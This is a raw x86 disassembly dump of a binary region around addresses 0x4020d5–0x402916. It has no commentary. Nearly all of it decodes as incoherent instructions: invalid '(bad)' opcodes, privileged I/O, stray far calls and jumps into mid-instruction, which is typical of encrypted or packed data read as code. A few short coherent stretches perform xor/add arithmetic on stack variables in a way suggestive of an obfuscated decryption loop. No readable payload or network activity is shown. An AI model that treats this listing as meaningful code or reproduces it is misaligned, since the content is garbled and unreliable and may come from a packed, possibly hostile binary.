  4020d5:	adc    al,BYTE PTR [edi+0x64]
  4020d8:	sub    esp,DWORD PTR es:[edx]
  4020db:	sbb    eax,0xb7c52607
  4020e0:	rol    DWORD PTR [ebx-0x2a],cl
  4020e3:	add    al,0x4a
  4020e5:	imul   eax,DWORD PTR [esi],0x2d7f739f
  4020eb:	mov    ecx,0xb082379b
  4020f0:	gs loop 0x4020c2
  4020f3:	add    eax,edi
  4020f5:	test   BYTE PTR [eax-0x131412fb],0xae
  4020fc:	mov    al,dh
  4020fe:	inc    ecx
  4020ff:	mov    ds:0x6a218206,al
  402104:	adc    edi,DWORD PTR es:[esi-0x63b3433]
  40210b:	xor    BYTE PTR [edx+0x58f9b444],bh
  402111:	or     eax,0xcfd46490
  402116:	pop    ss
  402117:	and    DWORD PTR [edx-0x59],0xfffffffa
  40211b:	ins    DWORD PTR es:[edi],dx
  40211c:	sar    DWORD PTR [edx+0x8],1
  40211f:	leave  
  402120:	mov    BYTE PTR [eax+ebp*4-0x6c],0xf9
  402125:	cmp    al,0x72
  402127:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402129:	and    ebp,DWORD PTR [esi+edx*2+0x6c]
  40212d:	pop    eax
  40212e:	(bad)  
  40212f:	dec    ecx
  402130:	addr16 nop
  402132:	aas    
  402133:	out    dx,eax
  402134:	dec    ebx
  402135:	adc    esi,0x20192d76
  40213b:	mov    ebx,0x81064fda
  402140:	jmp    0xe91e:0x781e55e
  402147:	and    DWORD PTR [esi],edi
  402149:	mov    edx,0xf667326c
  40214e:	xor    bl,BYTE PTR [ebp+0x5a545dbe]
  402154:	xor    bh,ah
  402156:	std    
  402157:	int3   
  402158:	xchg   esp,eax
  402159:	scas   al,BYTE PTR es:[edi]
  40215a:	ins    DWORD PTR es:[edi],dx
  40215b:	lods   eax,DWORD PTR ds:[esi]
  40215c:	data16 add al,0x33
  40215f:	mov    DWORD PTR [edx+0x25],eax
  402162:	fwait
  402163:	jbe    0x40219d
  402165:	xchg   ebp,eax
  402166:	scas   eax,DWORD PTR es:[edi]
  402167:	mov    edx,0xa1748ed8
  40216c:	push   ss
  40216d:	popa   
  40216e:	push   es
  40216f:	mov    ds:0x5a8994cc,eax
  402174:	lahf   
  402175:	ret    0xc3e1
  402178:	sub    eax,0xdaecce89
  40217d:	sub    eax,edi
  40217f:	enter  0x7266,0x52
  402183:	(bad)  
  402184:	fnstcw WORD PTR [esp+edi*4-0x570b5c44]
  40218b:	or     BYTE PTR [edi-0x39],ch
  40218e:	sbb    al,0xbb
  402190:	rcr    BYTE PTR es:[ecx],0xa3
  402194:	fadd   DWORD PTR [ecx]
  402196:	add    eax,0x53ba95af
  40219b:	or     esi,DWORD PTR [esi+0x6c]
  40219e:	cmp    eax,0x824f34cd
  4021a3:	loop   0x4021c4
  4021a5:	jecxz  0x4021e1
  4021a7:	js     0x402203
  4021a9:	xchg   BYTE PTR [esi-0xb744ed0],ah
  4021af:	sahf   
  4021b0:	mov    ebx,0x8a883520
  4021b5:	dec    eax
  4021b6:	in     al,0xe3
  4021b8:	add    BYTE PTR [eax+0x17],bl
  4021bb:	cmp    ch,bl
  4021bd:	add    ebp,DWORD PTR [edx]
  4021bf:	xchg   esp,eax
  4021c0:	(bad)  
  4021c1:	jp     0x402225
  4021c3:	int    0x97
  4021c5:	add    DWORD PTR [esi],edi
  4021c7:	mov    ecx,0x91653100
  4021cc:	jp     0x4021ee
  4021ce:	stos   DWORD PTR es:[edi],eax
  4021cf:	pop    edi
  4021d0:	sbb    ecx,edi
  4021d2:	inc    edx
  4021d3:	repz cmp eax,0x157fc7d6
  4021d9:	mov    edx,0xe96e04c2
  4021de:	imul   ecx,DWORD PTR [ebp+0x1cfc7181],0xda9ade7b
  4021e8:	push   edx
  4021e9:	sub    BYTE PTR [ecx],cl
  4021eb:	cmp    al,0x6e
  4021ed:	jg     0x402174
  4021ef:	ret    0xff27
  4021f2:	aaa    
  4021f3:	pusha  
  4021f4:	jno    0x4021cd
  4021f6:	inc    edx
  4021f7:	(bad)  
  4021f9:	aad    0x30
  4021fb:	pop    ecx
  4021fc:	xlat   BYTE PTR ds:[ebx]
  4021fd:	arpl   WORD PTR [ebx+ebx*8+0x19],di
  402201:	imul   ecx,DWORD PTR [ebx+ecx*4+0x7de04e36],0xffffffc5
  402209:	inc    ebx
  40220a:	jno    0x402202
  40220c:	inc    BYTE PTR [ebx-0x660591f6]
  402212:	test   edi,esi
  402214:	neg    DWORD PTR [edx+0x31]
  402217:	cmp    eax,0xb973cb50
  40221c:	retf   0xc1e8
  40221f:	stc    
  402220:	cli    
  402221:	mov    cs,ecx
  402223:	push   edx
  402224:	sbb    eax,0xc48e6906
  402229:	or     dh,bl
  40222b:	mov    dl,0x8e
  40222d:	das    
  40222e:	nop
  40222f:	rep ins BYTE PTR es:[edi],dx
  402231:	je     0x4021f9
  402233:	shr    BYTE PTR [edx],0xdc
  402236:	add    edx,0xffffffee
  402239:	das    
  40223a:	dec    eax
  40223b:	mov    eax,0xf143dc06
  402240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402241:	frstor [edi-0x77bf1eed]
  402247:	cwde   
  402248:	jp     0x40229a
  40224a:	out    0xaa,eax
  40224c:	mov    esi,0x2b2a927c
  402251:	inc    ebx
  402252:	aas    
  402253:	and    al,0x40
  402255:	popa   
  402256:	jecxz  0x4022ba
  402258:	cmp    bh,cl
  40225a:	mov    dh,0x26
  40225c:	jnp    0x4021eb
  40225e:	scas   al,BYTE PTR es:[edi]
  40225f:	out    0xe9,eax
  402261:	mov    dl,0xf4
  402263:	xlat   BYTE PTR ds:[ebx]
  402264:	pop    esi
  402265:	or     DWORD PTR [esi+0x7b4c4798],ebp
  40226b:	test   DWORD PTR [ebp-0x3cd5af9e],esi
  402271:	test   DWORD PTR [esi],esi
  402273:	and    al,0xea
  402275:	xor    eax,0x481840f
  40227a:	add    BYTE PTR [eax],al
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ecx+0x70367586],esp
  40229f:	add    dh,BYTE PTR [eax+0x70]
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	sbb    BYTE PTR ds:0xe63f653b,ch
  4022ac:	and    bh,BYTE PTR [edx]
  4022ae:	xchg   esi,eax
  4022af:	int3   
  4022b0:	lea    ecx,[ebp-0x4d]
  4022b3:	or     eax,0xcadd522f
  4022b8:	loop   0x40229f
  4022ba:	push   edx
  4022bb:	mov    ebx,0x6c9417d1
  4022c0:	scas   eax,DWORD PTR es:[edi]
  4022c1:	shr    BYTE PTR [ebx],1
  4022c3:	mov    ebp,0x63ebcb05
  4022c8:	jno    0x402299
  4022ca:	and    al,cl
  4022cc:	inc    eax
  4022cd:	and    DWORD PTR [edx+0x66e1087c],ecx
  4022d3:	rcl    BYTE PTR [ecx+eiz*1],1
  4022d6:	inc    eax
  4022d7:	cwde   
  4022d8:	adc    al,0xa3
  4022da:	daa    
  4022db:	sub    ebp,DWORD PTR [ebx+0x5a1d7436]
  4022e1:	push   esp
  4022e2:	fcom   DWORD PTR [ebx]
  4022e4:	pop    edi
  4022e5:	arpl   WORD PTR [ebp+0x32f23d33],cx
  4022eb:	rcl    BYTE PTR [ecx],cl
  4022ed:	fnstcw WORD PTR [ebx-0x44]
  4022f0:	mov    esp,0x5c88a46d
  4022f5:	das    
  4022f6:	fs mov ah,0x6e
  4022f9:	and    BYTE PTR [ecx+0x4e67c1d4],dh
  4022ff:	iret   
  402300:	and    BYTE PTR [esi+edx*1+0x3bafe251],bh
  402307:	call   0xb9c3:0xf377814c
  40230e:	jle    0x40233d
  402310:	pop    ebx
  402311:	in     eax,dx
  402312:	bound  esp,QWORD PTR ss:[ecx+eiz*1-0x35db9538]
  40231a:	mov    ch,0x88
  40231c:	xor    eax,0xc80f8acf
  402321:	lock stos DWORD PTR es:[edi],eax
  402323:	(bad)  
  402325:	stos   BYTE PTR es:[edi],al
  402326:	push   esp
  402327:	scas   al,BYTE PTR es:[edi]
  402328:	mov    esi,0xa82cc883
  40232d:	out    dx,eax
  40232e:	or     al,0xa7
  402330:	stos   BYTE PTR es:[edi],al
  402331:	pop    es
  402332:	jae    0x4022d9
  402334:	adc    eax,0x5ae762ef
  402339:	inc    ecx
  40233a:	sbb    eax,0xd4d334ca
  40233f:	ret    0xa3bc
  402342:	mov    cl,0x4d
  402344:	jge    0x402378
  402346:	call   0xe27a:0xa8298c71
  40234d:	scas   al,BYTE PTR es:[edi]
  40234e:	adc    al,0x5c
  402350:	pand   mm5,mm2
  402353:	mov    ah,0xb
  402355:	lods   eax,DWORD PTR ds:[esi]
  402356:	sbb    DWORD PTR [esp+edi*8],ebp
  402359:	push   ds
  40235a:	shl    DWORD PTR [edx+ebp*4+0x513f1ecc],0x7a
  402362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402363:	mov    edi,0x72af66e6
  402368:	inc    edi
  402369:	(bad)  
  40236a:	fmul   st(4),st
  40236c:	xor    eax,edi
  40236e:	call   0xadf67e85
  402373:	add    esp,DWORD PTR [esi]
  402375:	pop    edi
  402376:	push   cs
  402377:	popf   
  402378:	int    0xfb
  40237a:	gs hlt 
  40237c:	sbb    eax,DWORD PTR [ebp-0x16]
  40237f:	mov    eax,ds:0x56550e16
  402384:	mov    bl,BYTE PTR [ebx]
  402386:	lahf   
  402387:	dec    DWORD PTR [esp+ebp*8]
  40238a:	pop    edx
  40238b:	xor    DWORD PTR [edi],ecx
  40238d:	test   DWORD PTR [edi+eiz*4],0xd3103192
  402394:	dec    ebp
  402395:	(bad)  
  402396:	leave  
  402397:	cs inc ebp
  402399:	dec    esp
  40239a:	cs sub eax,0x50eb13ed
  4023a0:	dec    esi
  4023a1:	ds in  eax,dx
  4023a3:	adc    al,BYTE PTR [edx]
  4023a5:	xchg   edi,eax
  4023a6:	push   ebp
  4023a7:	mov    ch,BYTE PTR [ebx+0xd51ac1f]
  4023ad:	push   eax
  4023ae:	popa   
  4023af:	cdq    
  4023b0:	jmp    FWORD PTR [eax+0xb7165cf]
  4023b6:	mov    edi,0x78002228
  4023bb:	loope  0x402369
  4023bd:	loope  0x402354
  4023bf:	and    al,0x6
  4023c1:	mov    dh,0x23
  4023c3:	lock dec edi
  4023c5:	jnp    0x402359
  4023c7:	jmp    0x5495a911
  4023cc:	mov    ah,0x18
  4023ce:	add    al,0x88
  4023d0:	outs   dx,BYTE PTR ds:[esi]
  4023d1:	sub    dh,bh
  4023d3:	ins    DWORD PTR es:[edi],dx
  4023d4:	inc    edi
  4023d5:	or     al,0x43
  4023d7:	lds    eax,FWORD PTR [esi-0x535825d]
  4023dd:	sub    eax,0xdf3fb1f3
  4023e2:	fisub  WORD PTR ds:0x5d63ad7c
  4023e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023e9:	or     eax,0x6686e098
  4023ee:	imul   ebp,ecx,0xffffff94
  4023f1:	sub    ecx,DWORD PTR [edx]
  4023f3:	push   edx
  4023f4:	je     0x4023f4
  4023f6:	inc    ecx
  4023f7:	aad    0xc9
  4023f9:	xchg   ebp,eax
  4023fa:	adc    ah,cl
  4023fc:	icebp  
  4023fd:	js     0x4023bc
  4023ff:	mov    ebx,DWORD PTR fs:[ecx]
  402402:	rol    BYTE PTR [ebp+0x5ad64fee],1
  402408:	sti    
  402409:	es pop edi
  40240b:	loope  0x4023de
  40240d:	xchg   ebp,eax
  40240e:	ja     0x4023e1
  402410:	out    dx,al
  402411:	jl     0x40243e
  402413:	jl     0x40247f
  402415:	jmp    0xc925:0xe639f361
  40241c:	sti    
  40241d:	push   edi
  40241e:	pop    es
  40241f:	addr16 (bad) 
  402421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402422:	pop    edi
  402423:	xchg   DWORD PTR ds:0x5ab75836,ebx
  402429:	ror    BYTE PTR [edi+0x493820d8],0x95
  402430:	imul   ebp,DWORD PTR [ebp-0x5d1e6018],0x2
  402437:	push   0x5c
  402439:	and    ebx,DWORD PTR [esp+eiz*8+0x2d]
  40243d:	hlt    
  40243e:	cmp    eax,0xee667485
  402443:	mul    DWORD PTR ds:0x3e0c372f
  402449:	retf   0x318d
  40244c:	inc    ecx
  40244d:	fnsave [ecx+0x3f931489]
  402453:	shl    ecx,cl
  402455:	(bad)  
  402456:	fwait
  402457:	mov    ebx,DWORD PTR [ecx-0x3cd07dcf]
  40245d:	cmp    BYTE PTR [edi-0x5d],al
  402460:	je     0x40240e
  402462:	fisub  DWORD PTR [esi]
  402464:	das    
  402465:	cmp    al,0x9f
  402467:	dec    eax
  402468:	jne    0x402493
  40246a:	mov    ss,WORD PTR [ecx+ecx*4-0x6a432ec6]
  402471:	out    0xe1,al
  402473:	mov    ds:0x5bf82dcb,eax
  402478:	dec    eax
  402479:	cmp    dh,BYTE PTR [ebx+0x7cb6356d]
  40247f:	xchg   DWORD PTR [edi-0x5075d2a1],esi
  402485:	add    bl,0x8a
  402488:	cmp    al,0xa8
  40248a:	repz scas al,BYTE PTR es:[edi]
  40248c:	mov    edi,0xe548b7f4
  402491:	push   esp
  402492:	aas    
  402493:	xor    BYTE PTR [esi+0x278f6d02],bl
  402499:	pop    esi
  40249a:	call   0xe652ebff
  40249f:	mov    ecx,0x5cd79e1b
  4024a4:	mov    ebp,0x558b668e
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x7c2d0037],cl
  4024f4:	mov    DWORD PTR [eax+0x0],esi
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	xor    BYTE PTR [esi-0x22f90055],0x0
  402504:	mov    ds:0xe78be7d5,al
  402509:	popa   
  40250a:	ss push edi
  40250c:	iret   
  40250d:	jmp    0x40257c
  40250f:	mov    gs,WORD PTR [edi-0x4d700849]
  402515:	sub    BYTE PTR [esi-0x45],ah
  402518:	mov    ?,WORD PTR [edx+0xf]
  40251b:	xchg   edi,eax
  40251c:	out    0x33,al
  40251e:	lods   al,BYTE PTR ds:[esi]
  40251f:	ja     0x4024db
  402521:	popa   
  402522:	jecxz  0x402505
  402524:	jae    0x4024c7
  402526:	pop    ebx
  402527:	mov    ds:0xe2d6472b,eax
  40252c:	jp     0x402541
  40252e:	leave  
  40252f:	aad    0x2f
  402531:	in     eax,dx
  402532:	sub    BYTE PTR [eax],cl
  402534:	xor    ah,BYTE PTR [edx]
  402536:	test   edx,esi
  402538:	ins    BYTE PTR es:[edi],dx
  402539:	push   ss
  40253a:	jbe    0x4024c8
  40253c:	pop    edx
  40253d:	mov    ah,0x91
  40253f:	aam    0xd6
  402541:	xor    eax,0xb2954913
  402546:	sbb    al,BYTE PTR ds:0x49f7ac8c
  40254c:	add    DWORD PTR [ebx+eax*8-0x7e],0xffffffcf
  402551:	mov    eax,ds:0xf0fb3632
  402556:	lahf   
  402557:	out    0x29,al
  402559:	(bad)  
  40255a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40255b:	pop    edx
  40255c:	adc    eax,0xbb8070e4
  402561:	and    al,BYTE PTR [esi]
  402563:	paddd  mm4,QWORD PTR [esi]
  402566:	mov    bh,0x3f
  402568:	shl    DWORD PTR [ebx],0xc7
  40256b:	adc    edx,edx
  40256d:	out    dx,eax
  40256e:	dec    edx
  40256f:	enter  0x6bea,0x2d
  402573:	xchg   edi,eax
  402574:	mov    esi,0x7b11d142
  402579:	pop    eax
  40257a:	(bad)  
  40257b:	xor    ebp,DWORD PTR [edx]
  40257d:	adc    al,0x2a
  40257f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402580:	add    eax,DWORD PTR [edx+edx*8-0x5cac596e]
  402587:	clc    
  402588:	lahf   
  402589:	fcom   DWORD PTR ds:0x5a41d8f6
  40258f:	pop    esi
  402590:	stc    
  402591:	icebp  
  402592:	fld    QWORD PTR [ebx]
  402594:	push   0x8aad4ead
  402599:	hlt    
  40259a:	and    BYTE PTR [ecx-0x50],dh
  40259d:	call   0x6387:0xc5c8e021
  4025a4:	mov    eax,ds:0xfe41848f
  4025a9:	inc    ecx
  4025aa:	ja     0x40258e
  4025ac:	sbb    ebp,DWORD PTR [edi]
  4025ae:	adc    al,BYTE PTR [edx]
  4025b0:	jbe    0x4025c4
  4025b2:	fidivr WORD PTR [ebp+0x3a]
  4025b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b7:	aad    0xb3
  4025b9:	fsub   QWORD PTR [edx-0x1e]
  4025bc:	test   al,0x6e
  4025be:	jmp    0x51730fe0
  4025c3:	adc    BYTE PTR [esi-0x77f0b9],0xab
  4025ca:	retf   0x937b
  4025cd:	popa   
  4025ce:	xor    ecx,esp
  4025d0:	je     0x402622
  4025d2:	scas   eax,DWORD PTR es:[edi]
  4025d3:	dec    ebp
  4025d4:	and    esi,edi
  4025d6:	add    al,0xf7
  4025d8:	js     0x402582
  4025da:	retf   
  4025db:	mov    al,0x6b
  4025dd:	push   cs
  4025de:	leave  
  4025df:	inc    eax
  4025e0:	xor    al,0x4
  4025e2:	int3   
  4025e3:	push   ecx
  4025e4:	shl    bh,1
  4025e6:	mov    si,0x13a9
  4025ea:	sbb    BYTE PTR [eax+0x72],bl
  4025ed:	lock pusha 
  4025ef:	test   DWORD PTR [eax],ecx
  4025f1:	or     eax,0x888f94df
  4025f6:	push   ebp
  4025f7:	jno    0x402657
  4025f9:	xchg   esp,eax
  4025fa:	mov    edi,0x1a2de401
  4025ff:	lds    edi,FWORD PTR [edi+0x71]
  402602:	inc    BYTE PTR [edi-0x52678f65]
  402608:	mov    edi,0x2ce566f7
  40260d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40260e:	dec    edx
  40260f:	stos   DWORD PTR es:[edi],eax
  402610:	pop    ss
  402611:	paddb  mm2,QWORD PTR [esi+edi*8+0x73b5e490]
  402619:	xchg   ebp,eax
  40261a:	mov    DWORD PTR [edi+0x5c4e606a],ebx
  402620:	mul    DWORD PTR [ecx-0xdbd113c]
  402626:	fs sti 
  402628:	pop    eax
  402629:	in     al,0x93
  40262b:	sub    DWORD PTR [ecx+0x2fdff1ee],ecx
  402631:	inc    edi
  402632:	mov    bl,0x15
  402634:	dec    esp
  402635:	out    dx,eax
  402636:	jge    0x4025f7
  402638:	bound  edx,QWORD PTR [ecx+0x54]
  40263b:	cmp    eax,0xb348d1db
  402640:	sti    
  402641:	idiv   DWORD PTR [ecx+0x72]
  402644:	call   0x22e8:0x3ca91c5d
  40264b:	mov    DWORD PTR [edi],0xd1dffaa7
  402651:	sbb    bh,BYTE PTR [ecx+0x0]
  402654:	(bad)  
  402655:	lock dec ebp
  402657:	and    bh,ch
  402659:	mov    BYTE PTR [ebp+0x72],ch
  40265c:	xor    BYTE PTR [ebp*4+0x320a5365],0xa1
  402664:	add    cl,BYTE PTR [ebp-0x5d]
  402667:	retf   0xed19
  40266a:	les    ebp,FWORD PTR [ecx-0x2842b130]
  402670:	xchg   ebp,eax
  402671:	jge    0x402627
  402673:	pop    ebp
  402674:	inc    esi
  402675:	cmp    al,0x2a
  402677:	fwait
  402678:	jl     0x402692
  40267a:	lock cmp DWORD PTR [edx-0x23b22e76],ecx
  402681:	adc    eax,0x117fc1a8
  402686:	imul   ebx,eax,0x788ff704
  40268c:	iret   
  40268d:	imul   ebp,DWORD PTR [eax+0x64],0xcd7f9cf5
  402694:	clc    
  402695:	add    al,0x0
  402697:	inc    esi
  402698:	adc    al,0x33
  40269a:	cmp    DWORD PTR [ecx+ebx*2+0x6327648],ecx
  4026a1:	(bad)  
  4026a2:	push   ebx
  4026a3:	pop    es
  4026a4:	push   ss
  4026a5:	ds xor eax,0x71a4c061
  4026ab:	sbb    esi,edx
  4026ad:	sub    edx,DWORD PTR [edx]
  4026af:	ds sahf 
  4026b1:	xchg   ebx,eax
  4026b2:	js     0x40263d
  4026b4:	leave  
  4026b5:	out    0xb2,al
  4026b7:	(bad)  
  4026b8:	aam    0x1d
  4026ba:	call   0x13fe03e9
  4026bf:	push   es
  4026c0:	pop    ds
  4026c1:	mov    edx,0xf6d4841e
  4026c6:	mov    dh,0x8f
  4026c8:	mov    ds:0x2a7d67a0,eax
  4026cd:	inc    ebp
  4026ce:	push   eax
  4026cf:	cdq    
  4026d0:	loop   0x40272f
  4026d2:	and    BYTE PTR [edi-0x25],ah
  4026d5:	push   esp
  4026d6:	and    ch,ah
  4026d8:	das    
  4026d9:	fidivr WORD PTR [edi-0x70f88d43]
  4026df:	ds mov edx,0x2e7f09bb
  4026e5:	push   ebp
  4026e6:	mov    edi,0xe397cb47
  4026eb:	outs   dx,DWORD PTR ds:[esi]
  4026ec:	xor    eax,0xf84f9b99
  4026f1:	mov    esp,0xb8cd9dc8
  4026f6:	(bad)  
  4026f7:	or     edi,ebp
  4026f9:	xor    DWORD PTR [edi+0x458bc4b9],ebx
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xf7f4ece8
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	cmp    esp,DWORD PTR [esi-0x632d48fb]
  40276d:	stos   DWORD PTR es:[edi],eax
  40276e:	ror    BYTE PTR [eax-0x1f],1
  402771:	xor    dl,al
  402773:	aas    
  402774:	mov    dh,0x42
  402776:	dec    edx
  402777:	stos   DWORD PTR es:[edi],eax
  402778:	dec    esi
  402779:	fisttp WORD PTR [ebx-0x38]
  40277c:	jo     0x402722
  40277e:	aas    
  40277f:	jo     0x4027f7
  402781:	ins    BYTE PTR es:[edi],dx
  402782:	cmp    BYTE PTR [ebp+0x6781b9fa],al
  402788:	(bad)  
  402789:	lods   al,BYTE PTR ds:[esi]
  40278a:	add    al,0x3
  40278c:	jne    0x402792
  40278e:	xchg   al,ah
  402790:	leave  
  402791:	sbb    BYTE PTR [ecx+0x18],0xba
  402795:	push   ss
  402796:	mov    al,BYTE PTR [edi+0x3efe979a]
  40279c:	or     edx,DWORD PTR [ecx+ecx*2-0x71]
  4027a0:	int3   
  4027a1:	pop    esp
  4027a2:	lods   al,BYTE PTR ds:[esi]
  4027a3:	dec    ecx
  4027a4:	test   eax,0x9be18ba5
  4027a9:	jge    0x402785
  4027ab:	into   
  4027ac:	pcmpeqb mm6,mm1
  4027af:	and    ebx,DWORD PTR [ebx]
  4027b1:	add    eax,0x1f078088
  4027b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027b7:	mov    al,0x9e
  4027b9:	fnstenv [ebx+0x5eef6298]
  4027bf:	mov    bl,BYTE PTR [ebx+0x7ab2553c]
  4027c5:	daa    
  4027c6:	push   cs
  4027c7:	mov    cl,0x5f
  4027c9:	or     eax,DWORD PTR [edi+0xa]
  4027cc:	aaa    
  4027cd:	jmp    0x402811
  4027cf:	inc    edx
  4027d0:	je     0x402848
  4027d2:	and    dh,BYTE PTR [esi-0x57ce299]
  4027d8:	mov    ch,0x75
  4027da:	test   eax,0xee832d2e
  4027df:	cmp    ebx,eax
  4027e1:	je     0x4027a7
  4027e3:	scas   al,BYTE PTR es:[edi]
  4027e4:	mov    ecx,DWORD PTR [edi+edi*1-0x47]
  4027e8:	add    eax,0xc9abb4b1
  4027ed:	loope  0x402823
  4027ef:	mov    al,ds:0xba485c3e
  4027f4:	ins    BYTE PTR es:[edi],dx
  4027f5:	lock jecxz 0x402846
  4027f8:	mov    ebp,DWORD PTR [edi]
  4027fa:	aam    0xaf
  4027fc:	lods   eax,DWORD PTR ds:[esi]
  4027fd:	(bad)  
  4027fe:	ds cmp eax,0xb077feec
  402804:	in     al,dx
  402805:	mov    edi,0x20914a54
  40280a:	leave  
  40280b:	xchg   ecx,eax
  40280c:	push   0x3b83b971
  402811:	lods   al,BYTE PTR ds:[esi]
  402812:	imul   edx,DWORD PTR [esi+eiz*1],0x7434295a
  402819:	bound  edx,QWORD PTR [ecx]
  40281b:	add    DWORD PTR [edi-0x6ed571fe],eax
  402821:	loop   0x402801
  402823:	icebp  
  402824:	fiadd  DWORD PTR [ebp+0x288e4640]
  40282a:	lahf   
  40282b:	fisttp QWORD PTR [edi]
  40282d:	xor    BYTE PTR [edx+0x1a9066ff],bl
  402833:	cmp    BYTE PTR [ebx-0x60],bh
  402836:	push   ds
  402837:	sub    DWORD PTR [eax-0x7c],eax
  40283a:	sub    eax,DWORD PTR [esi+0x6db30d63]
  402840:	mov    ebx,DWORD PTR [ecx-0x4b2abc5c]
  402846:	cmp    ebx,DWORD PTR [ebp+0xc0247d8]
  40284c:	(bad)  
  40284d:	(bad)  
  40284e:	(bad)  
  40284f:	addr16 xor al,0x31
  402852:	mov    fs,WORD PTR [ebx-0x7d8373f]
  402858:	mov    eax,ds:0x1d46d4f0
  40285d:	jnp    0x4027f5
  40285f:	push   ebx
  402860:	inc    ebp
  402861:	dec    esi
  402862:	push   ebp
  402863:	test   eax,0x7c9af372
  402868:	aad    0x4
  40286a:	xchg   ebp,eax
  40286b:	add    al,0xba
  40286d:	in     eax,dx
  40286e:	test   ebx,ecx
  402870:	xor    BYTE PTR [ebp+0x7fb616c6],0xff
  402877:	jbe    0x40284a
  402879:	push   eax
  40287a:	sbb    ebx,ebx
  40287c:	mov    esi,0x939b81f3
  402881:	xor    ebp,DWORD PTR [ebp-0x6957fc1f]
  402887:	lods   al,BYTE PTR ds:[esi]
  402888:	sub    edx,DWORD PTR [edx]
  40288a:	ja     0x4028d2
  40288c:	lds    ecx,FWORD PTR [edi]
  40288e:	cmp    DWORD PTR [edi],eax
  402890:	lds    eax,FWORD PTR [edx-0x4d1974c1]
  402896:	inc    ebx
  402897:	jg     0x402885
  402899:	cld    
  40289a:	pop    esp
  40289b:	arpl   WORD PTR [esi],dx
  40289d:	jmp    0x40291d
  40289f:	mov    esp,0x251ead52
  4028a4:	or     dh,ch
  4028a6:	mov    ds:0x23cd93,eax
  4028ab:	in     al,0xf5
  4028ad:	xchg   DWORD PTR [esi+0x13],ecx
  4028b0:	cwde   
  4028b1:	jge    0x40292e
  4028b3:	sbb    BYTE PTR [ecx],0x7f
  4028b6:	cmp    esi,edi
  4028b8:	scas   eax,DWORD PTR es:[edi]
  4028b9:	adc    ebx,eax
  4028bb:	pop    edx
  4028bc:	stc    
  4028bd:	mov    bh,0x2a
  4028bf:	mov    ebp,0xb47d8548
  4028c4:	scas   al,BYTE PTR es:[edi]
  4028c5:	cmp    eax,0xd2364cf4
  4028ca:	jle    0x402856
  4028cc:	pop    edx
  4028cd:	sub    cl,ah
  4028cf:	mov    eax,0x11184d92
  4028d4:	and    al,0x55
  4028d6:	std    
  4028d7:	push   ss
  4028d8:	mov    ebx,0x26d62354
  4028dd:	mov    ebx,0xd2bd36a1
  4028e2:	sub    eax,0x78385751
  4028e7:	push   esp
  4028e8:	mov    dh,0xcf
  4028ea:	iret   
  4028eb:	test   al,0x27
  4028ed:	push   ss
  4028ee:	fldenv [edi-0x62319991]
  4028f4:	mov    bl,0xc4
  4028f6:	shl    dh,1
  4028f8:	push   es
  4028f9:	inc    edx
  4028fa:	mov    edx,esi
  4028fc:	jle    0x402953
  4028fe:	loopne 0x4028d2
  402900:	repnz push eax
  402902:	ror    BYTE PTR [ecx+0x2be532ab],cl
  402908:	arpl   cx,sp
  40290a:	and    DWORD PTR [edx+0x1e],ecx
  40290d:	mov    ecx,0x26019431
  402912:	mov    al,0xb9
  402914:	dec    edi
  402915:	ret    
  402916:	loop   0x40295a
